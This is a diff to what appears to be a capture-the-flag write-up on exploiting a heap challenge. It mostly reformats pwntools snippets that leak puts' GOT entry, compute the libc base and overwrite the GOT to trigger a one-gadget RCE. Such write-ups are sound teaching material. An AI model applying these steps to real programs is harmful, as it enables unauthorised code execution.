@@ -32,14 +32,17 @@ To use a one-gadget-RCE we need to know a few things:
 #### 1. Finding libc's base address
 
 We overwrite the name pointer to point to a libc function's got entry using this:
-`p64(exe.got['puts'])`
+	p64(exe.got['puts'])
+
 We read out the name pointer using the view marimo option, the name now points to the got entry ot puts giving us the address of puts in memory: 
-`puts_addr = u64(proc.recvline_startswith("name : ")[7:].ljust(8, '\x00'))`
+	puts_addr = u64(proc.recvline_startswith("name : ")[7:].ljust(8, '\x00'))
+
 We get the offset of puts from the relevant libc's base:
-`libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')`
-`libc_puts_addr = libc.symbols['puts']`
+	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+	libc_puts_addr = libc.symbols['puts']
+
 Then we calculate the address libc is based at currently:
-`libc_base = puts_addr - libc_puts_addr`
+	libc_base = puts_addr - libc_puts_addr
 
 Result will look similar to this:
 <p align="center">
@@ -68,7 +71,7 @@ For this exploit I went with this one(0x4526a):
   <img src="images/one_gadget_rce_disas.png">
 </p>
 
-#### Finding a got entry we can overwrite to trigger our gadget
+#### 3. Finding a got entry we can overwrite to trigger our gadget
 
 This one is easy. We know puts has an entry in the got and we know that it is used often, so it will immediately trigger our exploit.
 `p64(exe.got['puts'])`
